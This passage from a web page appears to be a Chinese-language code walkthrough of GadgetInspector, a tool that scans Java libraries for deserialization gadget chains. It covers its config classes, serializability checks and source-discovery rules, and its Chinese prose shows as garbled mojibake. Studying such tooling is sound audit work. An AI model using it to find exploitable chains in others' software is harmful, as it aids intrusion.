Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target); <span class="comment">// æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SourceDiscovery"><a href="#3-SourceDiscovery" class="headerlink" title="3. SourceDiscovery"></a>3. SourceDiscovery</h3><p>æŠ½è±¡ç±»ï¼Œå®ç°äº†æ±¡ç‚¹æºä¿¡æ¯çš„å­˜å‚¨æ–¹æ³•ï¼Œå­ç±»éœ€è¦å®ç°æ±¡ç‚¹æºçš„å…·ä½“æŸ¥æ‰¾æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceDiscovery</span> </span>&#123; <span class="comment">// æŠ½è±¡ç±»</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜æ‰¾åˆ°çš„æ±¡ç‚¹æº</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Source&gt; discoveredSources = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ·»åŠ æ±¡ç‚¹æº</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source æ±¡ç‚¹</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">addDiscoveredSource</span><span class="params">(Source source)</span> </span>&#123;</span><br><span class="line">        discoveredSources.add(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥æ‰¾æ±¡ç‚¹æº</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        <span class="comment">// åŠ è½½å‡½æ•°ä¿¡æ¯</span></span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨å®ç°ç±»çš„ discover æ–¹æ³•</span></span><br><span class="line">        discover(classMap, methodMap, inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŠ½è±¡æ–¹æ³• -&gt; å…·ä½“å®ç°</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨æ±¡ç‚¹æºä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> Source.Factory(), discoveredSources);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-config"><a href="#gadgetinspector-config" class="headerlink" title="gadgetinspector/config"></a>gadgetinspector/config</h2><p>å®šä¹‰é…ç½®ã€‚</p><h3 id="1-GIConfig"><a href="#1-GIConfig" class="headerlink" title="1. GIConfig"></a>1. GIConfig</h3><p>é…ç½®æ¥å£ï¼Œæ‰€æœ‰æ£€æµ‹å®ç°éƒ½å¿…é¡»å®ç°è¯¥æ¥å£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GIConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">// é…ç½®åç§°</span></span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    <span class="function">SerializableDecider <span class="title">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">    <span class="function">ImplementationFinder <span class="title">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾æ±¡ç‚¹æº</span></span><br><span class="line">    <span class="function">SourceDiscovery <span class="title">getSourceDiscovery</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ConfigRepository"><a href="#2-ConfigRepository" class="headerlink" title="2. ConfigRepository"></a>2. ConfigRepository</h3><p>å®šä¹‰é…ç½®åˆ—è¡¨ï¼Œç”¨äºè¿”å›é…ç½®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigRepository</span> </span>&#123;</span><br><span class="line">    <span class="comment">// é…ç½®åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;GIConfig&gt; ALL_CONFIGS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">            <span class="keyword">new</span> JavaDeserializationConfig(),        <span class="comment">// Java åŸç”Ÿåºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">new</span> JacksonDeserializationConfig(),     <span class="comment">// Jacksonï¼ˆJsonï¼‰</span></span><br><span class="line">            <span class="keyword">new</span> XstreamDeserializationConfig()));   <span class="comment">// XStreamï¼ˆXMLï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›é…ç½®</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name é…ç½®åç§°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> GIConfig <span class="title">getConfig</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (GIConfig config : ALL_CONFIGS) &#123;</span><br><span class="line">            <span class="keyword">if</span> (config.getName().equals(name)) &#123;</span><br><span class="line">                <span class="keyword">return</span> config;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-GIConfig-æ¥å£å®ç°"><a href="#3-GIConfig-æ¥å£å®ç°" class="headerlink" title="3. GIConfig æ¥å£å®ç°"></a>3. GIConfig æ¥å£å®ç°</h3><p>JavaDeserializationConfig</p><ul><li>é…ç½®åç§°ï¼š<code>jserial</code></li><li>åºåˆ—åŒ–å†³ç­–è€…ï¼šgadgetinspector/javaserial/SimpleSerializableDecider</li><li>æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼šgadgetinspector/javaserial/SimpleImplementationFinder</li><li>æŸ¥æ‰¾æ±¡ç‚¹æºï¼šgadgetinspector/javaserial/SimpleSourceDiscovery</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeserializationConfig</span> <span class="keyword">implements</span> <span class="title">GIConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;jserial&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SerializableDecider <span class="title">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ImplementationFinder <span class="title">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleImplementationFinder(getSerializableDecider(methodMap, inheritanceMap), methodImplMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SourceDiscovery <span class="title">getSourceDiscovery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleSourceDiscovery();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JacksonDeserializationConfig</p><ul><li>é…ç½®åç§°ï¼š<code>jackson</code></li><li>åºåˆ—åŒ–å†³ç­–è€…ï¼šgadgetinspector/jackson/JacksonSerializableDecider</li><li>æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼šgadgetinspector/jackson/JacksonImplementationFinder</li><li>æŸ¥æ‰¾æ±¡ç‚¹æºï¼šgadgetinspector/jackson/JacksonSourceDiscovery</li></ul><p>XstreamDeserializationConfig</p><ul><li>é…ç½®åç§°ï¼š<code>xstream</code></li><li>åºåˆ—åŒ–å†³ç­–è€…ï¼šgadgetinspector/xstream/XstreamSerializableDeciderã€gadgetinspector/xstream/CustomXstreamSerializableDecider</li><li>æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼šgadgetinspector/javaserial/SimpleImplementationFinder</li><li>æŸ¥æ‰¾æ±¡ç‚¹æºï¼šgadgetinspector/javaserial/SimpleSourceDiscovery</li></ul><h2 id="gadgetinspector-javaserial"><a href="#gadgetinspector-javaserial" class="headerlink" title="gadgetinspector/javaserial"></a>gadgetinspector/javaserial</h2><p>é’ˆå¯¹ Java åŸç”Ÿåºåˆ—åŒ–çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ£€æµ‹å®ç°ã€‚</p><h3 id="1-SimpleSerializableDecider"><a href="#1-SimpleSerializableDecider" class="headerlink" title="1. SimpleSerializableDecider"></a>1. SimpleSerializableDecider</h3><p>å®ç° <code>SerializableDecider</code> æ¥å£ï¼Œåˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSerializableDecider</span> <span class="keyword">implements</span> <span class="title">SerializableDecider</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Boolean&gt; cache = <span class="keyword">new</span> HashMap&lt;&gt;();  <span class="comment">// ç¼“å­˜åˆ¤æ–­ç»“æœï¼Œç±»-&gt;æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;    <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SimpleSerializableDecider</span><span class="params">(InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç±»æ˜¯å¦å¯ä»¥åºåˆ—åŒ–ï¼Œå¹¶å°†åˆ¤æ–­ç»“æœæ·»åŠ åˆ°ç¼“å­˜</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">apply</span><span class="params">(ClassReference.Handle handle)</span> </span>&#123;</span><br><span class="line">        Boolean cached = cache.get(handle);</span><br><span class="line">        <span class="keyword">if</span> (cached != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cached;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Boolean result = applyNoCache(handle);</span><br><span class="line"></span><br><span class="line">        cache.put(handle, result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç±»æ˜¯å¦å¯ä»¥åºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Boolean <span class="title">applyNoCache</span><span class="params">(ClassReference.Handle handle)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­ç±»æ˜¯å¦åœ¨é»‘åå•å†…</span></span><br><span class="line">        <span class="keyword">if</span> (isBlacklistedClass(handle)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ˜¯å¦æœ‰ç›´æ¥æˆ–é—´æ¥å®ç° java/io/Serializable åºåˆ—åŒ–æ¥å£</span></span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(handle, <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/io/Serializable&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç±»æ˜¯å¦åœ¨é»‘åå•å†…</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBlacklistedClass</span><span class="params">(ClassReference.Handle clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().startsWith(<span class="string">&quot;com/google/common/collect/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Serialization of these classes has been disabled since clojure 1.9.0</span></span><br><span class="line">        <span class="comment">// https://github.com/clojure/clojure/commit/271674c9b484d798484d134a5ac40a6df15d3ac3</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().equals(<span class="string">&quot;clojure/core/proxy$clojure/lang/APersistentMap$ff19274a&quot;</span>)</span><br><span class="line">                || clazz.getName().equals(<span class="string">&quot;clojure/inspector/proxy$javax/swing/table/AbstractTableModel$ff19274a&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SimpleImplementationFinder"><a href="#2-SimpleImplementationFinder" class="headerlink" title="2. SimpleImplementationFinder"></a>2. SimpleImplementationFinder</h3><p>å®ç° <code>ImplementationFinder</code> æ¥å£ï¼Œè¿”å›ç›®æ ‡æ–¹æ³•çš„å¯åºåˆ—åŒ–é‡å†™æ–¹æ³•ï¼ˆåŒ…æ‹¬ç›®æ ‡æ–¹æ³•æœ¬èº«ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleImplementationFinder</span> <span class="keyword">implements</span> <span class="title">ImplementationFinder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap;   <span class="comment">// é‡å†™æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SimpleImplementationFinder</span><span class="params">(SerializableDecider serializableDecider, Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">        <span class="keyword">this</span>.methodImplMap = methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target) &#123;</span><br><span class="line">        <span class="comment">// å­˜å‚¨å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; allImpls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Assume that the target method is always available, even if not serializable; the target may just be a local</span></span><br><span class="line">        <span class="comment">// instance rather than something an attacker can control.</span></span><br><span class="line">        allImpls.add(target);   <span class="comment">// é»˜è®¤è®¤ä¸ºç›®æ ‡æ–¹æ³•å¯åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†é‡å†™æ–¹æ³•</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; subClassImpls = methodImplMap.get(target);</span><br><span class="line">        <span class="keyword">if</span> (subClassImpls != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle subClassImpl : subClassImpls) &#123;</span><br><span class="line">                <span class="comment">// åˆ¤æ–­æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">                <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(subClassImpl.getClassReference()))) &#123;</span><br><span class="line">                    allImpls.add(subClassImpl); <span class="comment">// æ·»åŠ åˆ° allImpls</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> allImpls;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SimpleSourceDiscovery"><a href="#3-SimpleSourceDiscovery" class="headerlink" title="3. SimpleSourceDiscovery"></a>3. SimpleSourceDiscovery</h3><p>ç»§æ‰¿ <code>SourceDiscovery</code> æŠ½è±¡ç±»ï¼Œå®ç°å…·ä½“çš„æ±¡ç‚¹æºæŸ¥æ‰¾æ–¹æ³• <code>discover</code>ã€‚éå†ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯ï¼Œæ ¹æ®å®šä¹‰çš„ 5 æ¡è§„åˆ™æœç´¢æ±¡ç‚¹æºï¼š</p><ul><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”æ–¹æ³•ä¸ºæ— å‚æ•° void ç±»å‹çš„ finalize æ–¹æ³•</li><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”æ–¹æ³•ä¸ºæ¥å— ObjectInputStream ç±»å‹å‚æ•°çš„ void ç±»å‹çš„ readObject æ–¹æ³•</li><li>ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”ä¸º InvocationHandler çš„å­ç±»</li><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”æ–¹æ³•ä¸ºæ— å‚æ•° int ç±»å‹çš„ hashCode æ–¹æ³•æˆ–æ¥å— Object ç±»å‹å‚æ•°çš„ boolean ç±»å‹çš„ equals æ–¹æ³•</li><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”è¯¥ç±»ä¸º groovy Closure çš„å­ç±»ã€æ–¹æ³•ä¸º call æˆ– doCall</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 